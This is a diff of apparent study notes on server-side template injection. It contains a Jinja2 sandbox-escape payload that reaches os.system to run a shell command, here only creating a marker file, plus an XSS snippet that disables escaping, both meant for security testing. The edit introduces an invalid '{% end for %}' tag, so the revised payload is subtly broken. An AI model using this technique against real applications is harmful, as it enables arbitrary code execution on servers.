@@ -1,6 +1,5 @@
 Template Engine Injection
-Failing to validate user supplied input and 
-using it in your template files. 
+Failing to validate user supplied input and using it in your template files. 
 
 Injection can allow an attacker to pass and execute 
 arbitrary code in the language used to build the 
@@ -34,19 +33,16 @@ Host: example.com
 
 Submitting Payloads for Testing
 {% for x in [].__class__.__bases__[0].__subclasses__() %}
-{% if 'warning' in x.__name__ %}
-{{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie
-.txt')}}
-{%endif%}
-{%endfor%}
+    {% if 'warning' in x.__name__ %}
+        {{x()._module.__builtins__['__import__']('os').system('touch template_injection.txt')}}
+    {%endif%}
+{% end for %}
 
 To enable an XSS attack, you would have to disable escaping explicitly, as follows:
 {{ "<script>" | safe }}
 
-CTF Wiki, https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/
-python-sandbox-escape/
-•  HackTricks, https://book.hacktricks.xyz/misc/basic-python/
-bypass-python-sandboxes/
+CTF Wiki, https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/
+•  HackTricks, https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/
 •  Programmer Help, https://programmer.help/blogs/python-sandbox-escape.html
 
 Automating Template Injection
@@ -73,3 +69,4 @@ Some Templating engines
 2. Haml
 3. Erb
 4. Jinja2
+5. Pug https://pugjs.org/api/getting-started.html
